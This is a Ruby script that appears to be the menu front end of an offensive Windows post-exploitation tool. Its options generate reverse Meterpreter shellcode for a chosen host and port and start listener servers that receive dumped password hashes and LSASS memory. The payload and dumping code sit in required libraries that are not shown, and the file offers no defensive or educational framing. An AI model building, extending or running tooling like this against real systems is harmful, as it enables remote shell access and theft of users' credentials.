#!/usr/bin/env ruby
require './lib/core'
require './lib/menu'
require './lib/server_setup'
include MainCommands
include MsfCommands
include Menu
def server
  server_setup = ServerSetUp.new
  host = server_setup.get_host
  port = server_setup.get_port
  return host,port
end
def case_main_menu
  answer = main_menu
  case answer
    when '1'
      case_reverse_meterpreter_menu
    when '2'
      case_dump_hashes_menu
    when '3'
      case_dump_lsass_menu
    when '99'
      exit
    else
      print_error("Bad Choice")
      sleep(1)
      case_main_menu
    end
end
def case_reverse_meterpreter_menu
  reverse_meterpreter_answer = reverse_meterpreter
  case reverse_meterpreter_answer
    when '1'
      host,port = server
      generate_shellcode(host,port)
    when '2'
      host,port = server
      generate_shellcode(host,port)
	  when '3'
      host,port = server
      generate_shellcode(host,port)
    when '99'
      case_main_menu
    else
      print_error("Bad Choice")
      sleep(1)
      case_reverse_meterpreter_menu
    end
end
def case_dump_hashes_menu
  dump_hashes_answer = dump_hashes
  case dump_hashes_answer
    when '1'
      host,port = server
      hash_server(port)
    when '2'
      host,port = server
      hash_server(port)
    when '99'
      case_main_menu
    else
      print_error("Bad Choice")
      sleep(1)
      case_dump_hashes_menu
    end
end
def case_dump_lsass_menu
  dump_lsass_answer = dump_lsass
  case dump_lsass_answer
    when '1'
      host,port = server
      lsass_server(port)
    when '2'
      host,port = server
      lsass_server(port)
    when '99'
      case_main_menu
    else
      print_error("Bad Choice")
      sleep(1)
      case_dump_lsass_menu
    end 
end
begin
  case_main_menu
end
